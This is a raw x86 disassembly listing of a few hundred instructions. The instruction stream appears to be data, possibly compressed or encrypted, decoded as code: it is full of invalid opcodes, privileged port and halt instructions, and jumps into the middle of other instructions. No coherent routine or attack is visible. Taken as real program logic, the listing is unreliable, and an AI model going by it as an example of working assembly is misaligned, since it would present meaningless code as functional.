  433f66:	8d 69 e3             	lea    -0x1d(%ecx),%ebp
  433f69:	7a 4b                	jp     0x433fb6
  433f6b:	85 e2                	test   %esp,%edx
  433f6d:	b3 37                	mov    $0x37,%bl
  433f6f:	f1                   	int1
  433f70:	c2 b9 49             	ret    $0x49b9
  433f73:	d6                   	salc
  433f74:	c8 ad f3 0a          	enter  $0xf3ad,$0xa
  433f78:	d4 da                	aam    $0xda
  433f7a:	10 89 ea 9d 44 99    	adc    %cl,-0x66bb6216(%ecx)
  433f80:	4d                   	dec    %ebp
  433f81:	68 bb c2 01 b9       	push   $0xb901c2bb
  433f86:	73 b0                	jae    0x433f38
  433f88:	1d d4 22 5d 79       	sbb    $0x795d22d4,%eax
  433f8d:	1d 21 d1 c4 6f       	sbb    $0x6fc4d121,%eax
  433f92:	cf                   	iret
  433f93:	65 85 74 44 70       	test   %esi,%gs:0x70(%esp,%eax,2)
  433f98:	34 d4                	xor    $0xd4,%al
  433f9a:	ce                   	into
  433f9b:	2e 1a b6 54 03 47 a9 	sbb    %cs:-0x56b8fcac(%esi),%dh
  433fa2:	83 4f 30 96          	orl    $0xffffff96,0x30(%edi)
  433fa6:	1d 9e 91 03 cb       	sbb    $0xcb03919e,%eax
  433fab:	fc                   	cld
  433fac:	b6 c1                	mov    $0xc1,%dh
  433fae:	40                   	inc    %eax
  433faf:	70 e0                	jo     0x433f91
  433fb1:	ea e7 5a 9d c0 d8 12 	ljmp   $0x12d8,$0xc09d5ae7
  433fb8:	ab                   	stos   %eax,%es:(%edi)
  433fb9:	69 01 84 a8 77 26    	imul   $0x2677a884,(%ecx),%eax
  433fbf:	9c                   	pushf
  433fc0:	64 ab                	fs stos %eax,%es:(%edi)
  433fc2:	8d 21                	lea    (%ecx),%esp
  433fc4:	2f                   	das
  433fc5:	51                   	push   %ecx
  433fc6:	1f                   	pop    %ds
  433fc7:	4c                   	dec    %esp
  433fc8:	f6 f7                	div    %bh
  433fca:	92                   	xchg   %eax,%edx
  433fcb:	9b                   	fwait
  433fcc:	b1 31                	mov    $0x31,%cl
  433fce:	4c                   	dec    %esp
  433fcf:	42                   	inc    %edx
  433fd0:	8d 84 7c 9d f6 0f be 	lea    -0x41f00963(%esp,%edi,2),%eax
  433fd7:	5e                   	pop    %esi
  433fd8:	48                   	dec    %eax
  433fd9:	d9 fe                	fsin
  433fdb:	8e 85 49 56 5b 0d    	mov    0xd5b5649(%ebp),%es
  433fe1:	d7                   	xlat   %ds:(%ebx)
  433fe2:	fc                   	cld
  433fe3:	ec                   	in     (%dx),%al
  433fe4:	5c                   	pop    %esp
  433fe5:	11 d3                	adc    %edx,%ebx
  433fe7:	12 ac 12 84 fb d0 53 	adc    0x53d0fb84(%edx,%edx,1),%ch
  433fee:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  433fef:	d9 ca                	fxch   %st(2)
  433ff1:	b6 5d                	mov    $0x5d,%dh
  433ff3:	58                   	pop    %eax
  433ff4:	17                   	pop    %ss
  433ff5:	9d                   	popf
  433ff6:	96                   	xchg   %eax,%esi
  433ff7:	4f                   	dec    %edi
  433ff8:	eb 55                	jmp    0x43404f
  433ffa:	d6                   	salc
  433ffb:	ff                   	(bad)
  433ffc:	fa                   	cli
  433ffd:	9a 14 09 8b 10 32 18 	lcall  $0x1832,$0x108b0914
  434004:	9a 10 46 ce 2c 33 44 	lcall  $0x4433,$0x2cce4610
  43400b:	5b                   	pop    %ebx
  43400c:	2c cd                	sub    $0xcd,%al
  43400e:	4b                   	dec    %ebx
  43400f:	38 93 94 6c 51 d7    	cmp    %dl,-0x28ae936c(%ebx)
  434015:	cc                   	int3
  434016:	73 a0                	jae    0x433fb8
  434018:	f7 c6 51 71 66 80    	test   $0x80667151,%esi
  43401e:	d9 32                	fnstenv (%edx)
  434020:	49                   	dec    %ecx
  434021:	24 dc                	and    $0xdc,%al
  434023:	f3 27                	repz daa
  434025:	fb                   	sti
  434026:	07                   	pop    %es
  434027:	7a 27                	jp     0x434050
  434029:	5f                   	pop    %edi
  43402a:	c8 ba 88 c2          	enter  $0x88ba,$0xc2
  43402e:	61                   	popa
  43402f:	b8 2e 0b 8c bf       	mov    $0xbf8c0b2e,%eax
  434034:	51                   	push   %ecx
  434035:	2b e2                	sub    %edx,%esp
  434037:	a0 5b 98 58 c4       	mov    0xc458985b,%al
  43403c:	86 8e fe 1d ec e7    	xchg   %cl,-0x1813e202(%esi)
  434042:	97                   	xchg   %eax,%edi
  434043:	4e                   	dec    %esi
  434044:	23 5a 26             	and    0x26(%edx),%ebx
  434047:	5f                   	pop    %edi
  434048:	00 af 25 01 2e 64    	add    %ch,0x642e0125(%edi)
  43404e:	aa                   	stos   %al,%es:(%edi)
  43404f:	c3                   	ret
  434050:	52                   	push   %edx
  434051:	12 12                	adc    (%edx),%dl
  434053:	f0 85 cb             	lock test %ecx,%ebx
  434056:	a3 d8 1d 34 08       	mov    %eax,0x8341dd8
  43405b:	2c 4a                	sub    $0x4a,%al
  43405d:	c7                   	(bad)
  43405e:	e4 f5                	in     $0xf5,%al
  434060:	71 9f                	jno    0x434001
  434062:	26 c2 45 91          	es ret $0x9145
  434066:	5a                   	pop    %edx
  434067:	77 6d                	ja     0x4340d6
  434069:	ca ed 4c             	lret   $0x4ced
  43406c:	d8 71 98             	fdivs  -0x68(%ecx)
  43406f:	58                   	pop    %eax
  434070:	54                   	push   %esp
  434071:	35 b3 e4 35 4d       	xor    $0x4d35e4b3,%eax
  434076:	47                   	inc    %edi
  434077:	e4 1b                	in     $0x1b,%al
  434079:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  43407a:	1a de                	sbb    %dh,%bl
  43407c:	b6 f0                	mov    $0xf0,%dh
  43407e:	be 3d 09 c5 32       	mov    $0x32c5093d,%esi
  434083:	82 29 6a             	subb   $0x6a,(%ecx)
  434086:	ef                   	out    %eax,(%dx)
  434087:	ee                   	out    %al,(%dx)
  434088:	e9 74 fc 36 3e       	jmp    0x3e7a3d01
  43408d:	33 1f                	xor    (%edi),%ebx
  43408f:	d0 25 47 ec 86 86    	shlb   $1,0x8686ec47
  434095:	64 1d 93 c3 d7 a9    	fs sbb $0xa9d7c393,%eax
  43409b:	ce                   	into
  43409c:	0d 0f 3c c4 20       	or     $0x20c43c0f,%eax
  4340a1:	ea ab 17 79 f6 4f 30 	ljmp   $0x304f,$0xf67917ab
  4340a8:	15 1b 5a 2e ea       	adc    $0xea2e5a1b,%eax
  4340ad:	98                   	cwtl
  4340ae:	0d 2e 5b e0 71       	or     $0x71e05b2e,%eax
  4340b3:	b2 4c                	mov    $0x4c,%dl
  4340b5:	78 4f                	js     0x434106
  4340b7:	94                   	xchg   %eax,%esp
  4340b8:	d7                   	xlat   %ds:(%ebx)
  4340b9:	07                   	pop    %es
  4340ba:	0e                   	push   %cs
  4340bb:	5e                   	pop    %esi
  4340bc:	f6 25 5a df e6 dc    	mulb   0xdce6df5a
  4340c2:	ee                   	out    %al,(%dx)
  4340c3:	bf ec 2e bd f1       	mov    $0xf1bd2eec,%edi
  4340c8:	47                   	inc    %edi
  4340c9:	f1                   	int1
  4340ca:	30 bb f7 4f c7 76    	xor    %bh,0x76c74ff7(%ebx)
  4340d0:	1b 7e e7             	sbb    -0x19(%esi),%edi
  4340d3:	6d                   	insl   (%dx),%es:(%edi)
  4340d4:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4340d5:	da 21                	fisubl (%ecx)
  4340d7:	c4 4c 5c 52          	les    0x52(%esp,%ebx,2),%ecx
  4340db:	8b 59 fb             	mov    -0x5(%ecx),%ebx
  4340de:	80 fd 33             	cmp    $0x33,%ch
  4340e1:	99                   	cltd
  4340e2:	62 cd 2c             	(bad) {rz-bad},{bad}
  4340e5:	f0 af                	lock scas %es:(%edi),%eax
  4340e7:	e2 76                	loop   0x43415f
  4340e9:	1e                   	push   %ds
  4340ea:	5f                   	pop    %edi
  4340eb:	62 9d 04 a9 7f 34    	bound  %ebx,0x347fa904(%ebp)
  4340f1:	58                   	pop    %eax
  4340f2:	d3 3c 70             	sarl   %cl,(%eax,%esi,2)
  4340f5:	d0 85 99 4b 9d 8b    	rolb   $1,-0x7462b467(%ebp)
  4340fb:	0f f1 a1 e3 4e 61 6a 	psllw  0x6a614ee3(%ecx),%mm4
  434102:	49                   	dec    %ecx
  434103:	2c 5b                	sub    $0x5b,%al
  434105:	28 a7 6c 9f ff d4    	sub    %ah,-0x2b006094(%edi)
  43410b:	3e 8c 19             	mov    %ds,%ds:(%ecx)
  43410e:	c8 34 13 cc          	enter  $0x1334,$0xcc
  434112:	b2 c5                	mov    $0xc5,%dl
  434114:	01 5a 45             	add    %ebx,0x45(%edx)
  434117:	9b                   	fwait
  434118:	27                   	daa
  434119:	0d 2a 7b 45 40       	or     $0x40457b2a,%eax
  43411e:	71 e8                	jno    0x434108
  434120:	46                   	inc    %esi
  434121:	ab                   	stos   %eax,%es:(%edi)
  434122:	bf 6f 50 e7 25       	mov    $0x25e7506f,%edi
  434127:	49                   	dec    %ecx
  434128:	b0 2b                	mov    $0x2b,%al
  43412a:	8b f6                	mov    %esi,%esi
  43412c:	0f 59 14 b7          	mulps  (%edi,%esi,4),%xmm2
  434130:	bf 28 75 0d 2a       	mov    $0x2a0d7528,%edi
  434135:	af                   	scas   %es:(%edi),%eax
  434136:	b4 8d                	mov    $0x8d,%ah
  434138:	82 bf 40 62 1d 9c ce 	cmpb   $0xce,-0x63e29dc0(%edi)
  43413f:	04 53                	add    $0x53,%al
  434141:	fb                   	sti
  434142:	1e                   	push   %ds
  434143:	af                   	scas   %es:(%edi),%eax
  434144:	65 47                	gs inc %edi
  434146:	ac                   	lods   %ds:(%esi),%al
  434147:	72 2f                	jb     0x434178
  434149:	46                   	inc    %esi
  43414a:	58                   	pop    %eax
  43414b:	49                   	dec    %ecx
  43414c:	0d 97 2d 6f 3d       	or     $0x3d6f2d97,%eax
  434151:	7d 54                	jge    0x4341a7
  434153:	5c                   	pop    %esp
  434154:	49                   	dec    %ecx
  434155:	0a 37                	or     (%edi),%dh
  434157:	ef                   	out    %eax,(%dx)
  434158:	87 7e ad             	xchg   %edi,-0x53(%esi)
  43415b:	2f                   	das
  43415c:	11 50 e6             	adc    %edx,-0x1a(%eax)
  43415f:	f3 7b 06             	repz jnp 0x434168
  434162:	6e                   	outsb  %ds:(%esi),(%dx)
  434163:	d8 38                	fdivrs (%eax)
  434165:	78 43                	js     0x4341aa
  434167:	ad                   	lods   %ds:(%esi),%eax
  434168:	97                   	xchg   %eax,%edi
  434169:	49                   	dec    %ecx
  43416a:	b9 57 17 83 87       	mov    $0x87831757,%ecx
  43416f:	31 03                	xor    %eax,(%ebx)
  434171:	99                   	cltd
  434172:	29 61 4d             	sub    %esp,0x4d(%ecx)
  434175:	0f f5 45 44          	pmaddwd 0x44(%ebp),%mm0
  434179:	c3                   	ret
  43417a:	33 5b 32             	xor    0x32(%ebx),%ebx
  43417d:	e4 c4                	in     $0xc4,%al
  43417f:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  434180:	f5                   	cmc
  434181:	ab                   	stos   %eax,%es:(%edi)
  434182:	2d 1c 6d cf bb       	sub    $0xbbcf6d1c,%eax
  434187:	6d                   	insl   (%dx),%es:(%edi)
  434188:	67 26 9c             	addr16 es pushf
  43418b:	37                   	aaa
  43418c:	03 b2 7c 73 e6 af    	add    -0x50198c84(%edx),%esi
  434192:	29 6f 0a             	sub    %ebp,0xa(%edi)
  434195:	8e eb                	mov    %ebx,%gs
  434197:	57                   	push   %edi
  434198:	e2 f6                	loop   0x434190
  43419a:	b9 96 f5 5e 3f       	mov    $0x3f5ef596,%ecx
  43419f:	3b 07                	cmp    (%edi),%eax
  4341a1:	83 82 ab 61 c6 cd c4 	addl   $0xffffffc4,-0x32399e55(%edx)
  4341a8:	fe                   	(bad)
  4341a9:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4341aa:	fd                   	std
  4341ab:	b5 72                	mov    $0x72,%ch
  4341ad:	a9 e7 58 bc bc       	test   $0xbcbc58e7,%eax
  4341b2:	0e                   	push   %cs
  4341b3:	7c d5                	jl     0x43418a
  4341b5:	c6                   	(bad)
  4341b6:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4341b7:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4341b8:	d0 70 c0             	shlb   $1,-0x40(%eax)
  4341bb:	bc 65 19 20 f5       	mov    $0xf5201965,%esp
  4341c0:	e7 7d                	out    %eax,$0x7d
  4341c2:	68 44 f0 b4 f6       	push   $0xf6b4f044
  4341c7:	5c                   	pop    %esp
  4341c8:	a2 ea 16 ad 7f       	mov    %al,0x7fad16ea
  4341cd:	1a 0d 4e 72 20 24    	sbb    0x2420724e,%cl
  4341d3:	05 f2 32 d4 45       	add    $0x45d432f2,%eax
  4341d8:	3a 6d f3             	cmp    -0xd(%ebp),%ch
  4341db:	43                   	inc    %ebx
  4341dc:	60                   	pusha
  4341dd:	95                   	xchg   %eax,%ebp
  4341de:	da 74 7f b5          	fidivl -0x4b(%edi,%edi,2)
  4341e2:	71 8a                	jno    0x43416e
  4341e4:	ef                   	out    %eax,(%dx)
  4341e5:	d5 c5                	aad    $0xc5
  4341e7:	76 52                	jbe    0x43423b
  4341e9:	74 5b                	je     0x434246
  4341eb:	ac                   	lods   %ds:(%esi),%al
  4341ec:	45                   	inc    %ebp
  4341ed:	9d                   	popf
  4341ee:	ab                   	stos   %eax,%es:(%edi)
  4341ef:	c3                   	ret
  4341f0:	d3 cf                	ror    %cl,%edi
  4341f2:	a9 2b 7a 4c 70       	test   $0x704c7a2b,%eax
  4341f7:	d5 76                	aad    $0x76
  4341f9:	05 3f 81 f2 74       	add    $0x74f2813f,%eax
  4341fe:	81 22 bc f2 3c 42    	andl   $0x423cf2bc,(%edx)
  434204:	67 12 00             	adc    (%bx,%si),%al
  434207:	aa                   	stos   %al,%es:(%edi)
  434208:	4e                   	dec    %esi
  434209:	88 a7 9a e2 24 4b    	mov    %ah,0x4b24e29a(%edi)
  43420f:	1f                   	pop    %ds
  434210:	97                   	xchg   %eax,%edi
  434211:	1a 17                	sbb    (%edi),%dl
  434213:	f5                   	cmc
  434214:	f6 87 8d 0b 90 6b d6 	testb  $0xd6,0x6b900b8d(%edi)
  43421b:	7f 0c                	jg     0x434229
  43421d:	1f                   	pop    %ds
  43421e:	23 5c 60 51          	and    0x51(%eax,%eiz,2),%ebx
  434222:	5e                   	pop    %esi
  434223:	c9                   	leave
  434224:	33 e0                	xor    %eax,%esp
  434226:	b3 2e                	mov    $0x2e,%bl
  434228:	51                   	push   %ecx
  434229:	da 67 3d             	fisubl 0x3d(%edi)
  43422c:	d9 2b                	fldcw  (%ebx)
  43422e:	98                   	cwtl
  43422f:	37                   	aaa
  434230:	ce                   	into
  434231:	c8 4d b5 1e          	enter  $0xb54d,$0x1e
  434235:	3b 1b                	cmp    (%ebx),%ebx
  434237:	b5 bf                	mov    $0xbf,%ch
  434239:	fe                   	(bad)
  43423a:	ac                   	lods   %ds:(%esi),%al
  43423b:	c2 fb ca             	ret    $0xcafb
  43423e:	ee                   	out    %al,(%dx)
  43423f:	6a e4                	push   $0xffffffe4
  434241:	26 19 0f             	sbb    %ecx,%es:(%edi)
  434244:	c0 de 70             	rcr    $0x70,%dh
  434247:	84 86 2f c2 38 8d    	test   %al,-0x72c73dd1(%esi)
  43424d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  43424e:	1d f1 d6 18 69       	sbb    $0x6918d6f1,%eax
  434253:	94                   	xchg   %eax,%esp
  434254:	6f                   	outsl  %ds:(%esi),(%dx)
  434255:	db 62 c3             	(bad) -0x3d(%edx)
  434258:	d6                   	salc
  434259:	99                   	cltd
  43425a:	0b f1                	or     %ecx,%esi
  43425c:	c7                   	(bad)
  43425d:	61                   	popa
  43425e:	28 38                	sub    %bh,(%eax)
  434260:	83 a2 f3 8f 69 08 cb 	andl   $0xffffffcb,0x8698ff3(%edx)
  434267:	e0 51                	loopne 0x4342ba
  434269:	71 86                	jno    0x4341f1
  43426b:	c7                   	(bad)
  43426c:	7a ba                	jp     0x434228
  43426e:	17                   	pop    %ss
  43426f:	72 53                	jb     0x4342c4
  434271:	14 de                	adc    $0xde,%al
  434273:	a1 42 58 cc f5       	mov    0xf5cc5842,%eax
  434278:	46                   	inc    %esi
  434279:	d8 01                	fadds  (%ecx)
  43427b:	99                   	cltd
  43427c:	e2 5a                	loop   0x4342d8
  43427e:	d7                   	xlat   %ds:(%ebx)
  43427f:	07                   	pop    %es
  434280:	57                   	push   %edi
  434281:	38 92 ae fd 12 39    	cmp    %dl,0x3912fdae(%edx)
  434287:	59                   	pop    %ecx
  434288:	0f d2 56 6d          	psrld  0x6d(%esi),%mm2
  43428c:	47                   	inc    %edi
  43428d:	d2 05 eb 2c 04 23    	rolb   %cl,0x23042ceb
  434293:	d3 8e 97 0a 8b 9a    	rorl   %cl,-0x6574f569(%esi)
  434299:	16                   	push   %ss
  43429a:	d2 8e d0 4c c3 a2    	rorb   %cl,-0x5d3cb330(%esi)
  4342a0:	8a e3                	mov    %bl,%ah
  4342a2:	78 57                	js     0x4342fb
  4342a4:	9b                   	fwait
  4342a5:	aa                   	stos   %al,%es:(%edi)
  4342a6:	6e                   	outsb  %ds:(%esi),(%dx)
  4342a7:	bf af 56 9d 8d       	mov    $0x8d9d56af,%edi
  4342ac:	89 92 7e 64 78 aa    	mov    %edx,-0x55879b82(%edx)
  4342b2:	84 21                	test   %ah,(%ecx)
  4342b4:	f4                   	hlt
  4342b5:	14 e4                	adc    $0xe4,%al
  4342b7:	d2 54 98 52          	rclb   %cl,0x52(%eax,%ebx,4)
  4342bb:	e0 29                	loopne 0x4342e6
  4342bd:	04 a7                	add    $0xa7,%al
  4342bf:	27                   	daa
  4342c0:	a0 c8 7e ed 8d       	mov    0x8ded7ec8,%al
  4342c5:	38 ff                	cmp    %bh,%bh
  4342c7:	8f                   	(bad)
  4342c8:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4342c9:	6e                   	outsb  %ds:(%esi),(%dx)
  4342ca:	db cc                	fcmovne %st(4),%st
  4342cc:	19 99 bc b5 18 28    	sbb    %ebx,0x2818b5bc(%ecx)
  4342d2:	bc 90 3b c1 36       	mov    $0x36c13b90,%esp
  4342d7:	41                   	inc    %ecx
  4342d8:	43                   	inc    %ebx
  4342d9:	c7                   	(bad)
  4342da:	d8 f8                	fdivr  %st(0),%st
  4342dc:	25 d7 5e 9f 32       	and    $0x329f5ed7,%eax
  4342e1:	17                   	pop    %ss
  4342e2:	05 aa af bc 2a       	add    $0x2abcafaa,%eax
  4342e7:	12 86 ae 53 9e c0    	adc    -0x3f61ac52(%esi),%al
  4342ed:	39 84 cb f6 b0 fa 04 	cmp    %eax,0x4fab0f6(%ebx,%ecx,8)
  4342f4:	1c 81                	sbb    $0x81,%al
  4342f6:	f5                   	cmc
  4342f7:	3a d0                	cmp    %al,%dl
  4342f9:	86 26                	xchg   %ah,(%esi)
  4342fb:	4d                   	dec    %ebp
  4342fc:	65 c5 d4 fe          	(bad)
  434300:	22 60 7d             	and    0x7d(%eax),%ah
  434303:	81 66 9e eb 86 c0 9a 	andl   $0x9ac086eb,-0x62(%esi)
  43430a:	2d 5b 51 da 93       	sub    $0x93da515b,%eax
  43430f:	ac                   	lods   %ds:(%esi),%al
  434310:	dc 20                	fsubl  (%eax)
  434312:	58                   	pop    %eax
  434313:	50                   	push   %eax
  434314:	53                   	push   %ebx
  434315:	af                   	scas   %es:(%edi),%eax
  434316:	bb 26 0b 0b 0b       	mov    $0xb0b0b26,%ebx
  43431b:	eb 0b                	jmp    0x434328
  43431d:	42                   	inc    %edx
  43431e:	0b 19                	or     (%ecx),%ebx
  434320:	fc                   	cld
  434321:	d0 54 c9 7e          	rclb   $1,0x7e(%ecx,%ecx,8)
  434325:	23 9a ae 44 1a 90    	and    -0x6fe5bb52(%edx),%ebx
  43432b:	b0 42                	mov    $0x42,%al
  43432d:	32 76 c4             	xor    -0x3c(%esi),%dh
  434330:	23 e4                	and    %esp,%esp
  434332:	0a ba cd 26 7f 72    	or     0x727f26cd(%edx),%bh
  434338:	48                   	dec    %eax
  434339:	86 3e                	xchg   %bh,(%esi)
  43433b:	44                   	inc    %esp
  43433c:	5e                   	pop    %esi
  43433d:	1c c7                	sbb    $0xc7,%al
  43433f:	bc ad d0 be 6e       	mov    $0x6ebed0ad,%esp
  434344:	66 56                	push   %si
  434346:	cb                   	lret
  434347:	85 1c 94             	test   %ebx,(%esp,%edx,4)
  43434a:	d9 82 08 26 b4 97    	flds   -0x684bd9f8(%edx)
  434350:	f0 f7 89 07 2f a5 b3 	lock testl $0x51f254e3,-0x4c5ad0f9(%ecx)
  434357:	e3 54 f2 51 
  43435b:	ca 93 d7             	lret   $0xd793
  43435e:	82 3d 36 cc 6c 89 5c 	cmpb   $0x5c,0x896ccc36
  434365:	91                   	xchg   %eax,%ecx
  434366:	3e 0e                	ds push %cs
  434368:	06                   	push   %es
  434369:	75 0c                	jne    0x434377
  43436b:	97                   	xchg   %eax,%edi
  43436c:	14 02                	adc    $0x2,%al
  43436e:	fc                   	cld
  43436f:	b2 01                	mov    $0x1,%dl
  434371:	04 4e                	add    $0x4e,%al
  434373:	46                   	inc    %esi
  434374:	06                   	push   %es
  434375:	8b 25 63 6d 1e 2a    	mov    0x2a1e6d63,%esp
  43437b:	4e                   	dec    %esi
  43437c:	e4 4e                	in     $0x4e,%al
  43437e:	b6 c6                	mov    $0xc6,%dh
  434380:	a0 d4 d4 fb ca       	mov    0xcafbd4d4,%al
  434385:	34 96                	xor    $0x96,%al
  434387:	d6                   	salc
  434388:	f4                   	hlt
  434389:	40                   	inc    %eax
  43438a:	3a 8c 35 ef c7 aa d3 	cmp    -0x2c553811(%ebp,%esi,1),%cl
  434391:	aa                   	stos   %al,%es:(%edi)
  434392:	0b c9                	or     %ecx,%ecx
  434394:	56                   	push   %esi
  434395:	f4                   	hlt
  434396:	ed                   	in     (%dx),%eax
  434397:	5f                   	pop    %edi
  434398:	a1 3b 6e b1 41       	mov    0x41b16e3b,%eax
  43439d:	f1                   	int1
  43439e:	02 d7                	add    %bh,%dl
  4343a0:	43                   	inc    %ebx
  4343a1:	a3 aa ff 5f 30       	mov    %eax,0x305fffaa
  4343a6:	99                   	cltd
  4343a7:	08 bd 6b 7a 8b 73    	or     %bh,0x738b7a6b(%ebp)
  4343ad:	22 fb                	and    %bl,%bh
  4343af:	22 7f 28             	and    0x28(%edi),%bh
  4343b2:	77 2c                	ja     0x4343e0
  4343b4:	df c6                	ffreep %st(6)
  4343b6:	8a a2 e2 46 1c b0    	mov    -0x4fe3b91e(%edx),%ah
  4343bc:	af                   	scas   %es:(%edi),%eax
  4343bd:	db 12                	fistl  (%edx)
  4343bf:	ec                   	in     (%dx),%al
  4343c0:	7d af                	jge    0x434371
  4343c2:	bd 25 80 d6 99       	mov    $0x99d68025,%ebp
  4343c7:	37                   	aaa
  4343c8:	9a dc ab 31 02 6a 90 	lcall  $0x906a,$0x231abdc
  4343cf:	ac                   	lods   %ds:(%esi),%al
  4343d0:	b8 dd 1d d3 82       	mov    $0x82d31ddd,%eax
  4343d5:	76 5d                	jbe    0x434434
  4343d7:	a1 fc 12 4c 05       	mov    0x54c12fc,%eax
  4343dc:	5a                   	pop    %edx
  4343dd:	5c                   	pop    %esp
  4343de:	32 91 ee 2a b0 40    	xor    0x40b02aee(%ecx),%dl
  4343e4:	87 6b ed             	xchg   %ebp,-0x13(%ebx)
  4343e7:	35 49 3e 05 bf       	xor    $0xbf053e49,%eax
  4343ec:	4a                   	dec    %edx
  4343ed:	57                   	push   %edi
  4343ee:	fa                   	cli
  4343ef:	8e 77 cc             	mov    -0x34(%edi),%?
  4343f2:	e9 d2 4f df 64       	jmp    0x652293c9
  4343f7:	43                   	inc    %ebx
  4343f8:	cc                   	int3
  4343f9:	17                   	pop    %ss
  4343fa:	db 5d 1b             	fistpl 0x1b(%ebp)
  4343fd:	11 a4 cb 06 74 2b 29 	adc    %esp,0x292b7406(%ebx,%ecx,8)
  434404:	ac                   	lods   %ds:(%esi),%al
  434405:	1a 3f                	sbb    (%edi),%bh
  434407:	c2 bb 74             	ret    $0x74bb
  43440a:	70 dc                	jo     0x4343e8
  43440c:	73 d0                	jae    0x4343de
  43440e:	03 a5 2e 7e d8 01    	add    0x1d87e2e(%ebp),%esp
  434414:	a3 ff d4 6b 7f       	mov    %eax,0x7f6bd4ff
  434419:	7c 3c                	jl     0x434457
  43441b:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  43441c:	e4 50                	in     $0x50,%al
  43441e:	96                   	xchg   %eax,%esi
  43441f:	79 a2                	jns    0x4343c3
  434421:	84 cc                	test   %cl,%ah
  434423:	3c 2a                	cmp    $0x2a,%al
  434425:	d4 2e                	aam    $0x2e
  434427:	ad                   	lods   %ds:(%esi),%eax
  434428:	3c 81                	cmp    $0x81,%al
  43442a:	9a cb 88 4d 24 05 bf 	lcall  $0xbf05,$0x244d88cb
  434431:	c6                   	(bad)
  434432:	23 37                	and    (%edi),%esi
  434434:	0f fd 86 8e bb 26 c6 	paddw  -0x39d94472(%esi),%mm0
  43443b:	24 53                	and    $0x53,%al
  43443d:	89 b5 27 14 69 0f    	mov    %esi,0xf691427(%ebp)
  434443:	d6                   	salc
  434444:	fd                   	std
  434445:	4b                   	dec    %ebx
  434446:	79 c7                	jns    0x43440f
  434448:	56                   	push   %esi
  434449:	37                   	aaa
  43444a:	6c                   	insb   (%dx),%es:(%edi)
  43444b:	b2 09                	mov    $0x9,%dl
  43444d:	83 10 eb             	adcl   $0xffffffeb,(%eax)
  434450:	01 29                	add    %ebp,(%ecx)
  434452:	38 30                	cmp    %dh,(%eax)
  434454:	2b 0c 94             	sub    (%esp,%edx,4),%ecx
  434457:	3d b9 20 9d f7       	cmp    $0xf79d20b9,%eax
  43445c:	83 42 ec 0e          	addl   $0xe,-0x14(%edx)
  434460:	ce                   	into
  434461:	7e c9                	jle    0x43442c
  434463:	58                   	pop    %eax
  434464:	60                   	pusha
  434465:	88 0e                	mov    %cl,(%esi)
  434467:	93                   	xchg   %eax,%ebx
  434468:	c5 4b 26             	lds    0x26(%ebx),%ecx
  43446b:	12 2d 5c c3 b0 cb    	adc    0xcbb0c35c,%ch
  434471:	05 80 05 91 07       	add    $0x7910580,%eax
  434476:	e2 41                	loop   0x4344b9
  434478:	65 b6 64             	gs mov $0x64,%dh
  43447b:	02 09                	add    (%ecx),%cl
  43447d:	fa                   	cli
  43447e:	83 d8 6b             	sbb    $0x6b,%eax
  434481:	87 f9                	xchg   %edi,%ecx
  434483:	b1 0c                	mov    $0xc,%cl
  434485:	7e 87                	jle    0x43440e
  434487:	18 7b 40             	sbb    %bh,0x40(%ebx)
  43448a:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  43448b:	56                   	push   %esi
  43448c:	bf 49 62 13 59       	mov    $0x59136249,%edi
  434491:	18 24 d6             	sbb    %ah,(%esi,%edx,8)
  434494:	e1 1d                	loope  0x4344b3
  434496:	f0 2c 90             	lock sub $0x90,%al
  434499:	2d 4f ce 7a 9a       	sub    $0x9a7ace4f,%eax
  43449e:	bf fa 27 42 59       	mov    $0x594227fa,%edi
  4344a3:	9b                   	fwait
  4344a4:	cc                   	int3
  4344a5:	ab                   	stos   %eax,%es:(%edi)
  4344a6:	3d 13 8e a3 72       	cmp    $0x72a38e13,%eax
  4344ab:	01 6d 0e             	add    %ebp,0xe(%ebp)
  4344ae:	bb 18 f1 19 54       	mov    $0x5419f118,%ebx
  4344b3:	a3 48 c4 24 ce       	mov    %eax,0xce24c448
  4344b8:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4344b9:	2b c4                	sub    %esp,%eax
  4344bb:	54                   	push   %esp
  4344bc:	3c dc                	cmp    $0xdc,%al
  4344be:	b9 b8 ff 05 24       	mov    $0x2405ffb8,%ecx
  4344c3:	17                   	pop    %ss
  4344c4:	20 ee                	and    %ch,%dh
  4344c6:	74 d2                	je     0x43449a
  4344c8:	4f                   	dec    %edi
  4344c9:	05 04 e5 05 5e       	add    $0x5e05e504,%eax
  4344ce:	4a                   	dec    %edx
  4344cf:	d2 75 ef             	shlb   %cl,-0x11(%ebp)
  4344d2:	aa                   	stos   %al,%es:(%edi)
  4344d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4344d4:	0f 99 58 eb          	setns  -0x15(%eax)
  4344d8:	a0 db 66 c6 7a       	mov    0x7ac666db,%al
  4344dd:	a0 1b 41 77 fa       	mov    0xfa77411b,%al
  4344e2:	08 74 f1 1f          	or     %dh,0x1f(%ecx,%esi,8)
  4344e6:	51                   	push   %ecx
  4344e7:	e1 fd                	loope  0x4344e6
  4344e9:	26 c6                	es (bad)
  4344eb:	8d                   	lea    (bad),%ecx
  4344ec:	ca 18 a8             	lret   $0xa818
  4344ef:	26 48                	es dec %eax
  4344f1:	cc                   	int3
  4344f2:	24 87                	and    $0x87,%al
  4344f4:	2f                   	das
  4344f5:	9d                   	popf
  4344f6:	70 70                	jo     0x434568
  4344f8:	cf                   	iret
  4344f9:	dc 7d 7c             	fdivrl 0x7c(%ebp)
  4344fc:	b7 99                	mov    $0x99,%bh
  4344fe:	15 c9 8f 88 36       	adc    $0x36888fc9,%eax
  434503:	2b 74 2a d5          	sub    -0x2b(%edx,%ebp,1),%esi
  434507:	8d                   	lea    (bad),%esp
  434508:	e2 5b                	loop   0x434565
  43450a:	1e                   	push   %ds
  43450b:	c2 c3 fa             	ret    $0xfac3
  43450e:	68 37 fd bd d3       	push   $0xd3bdfd37
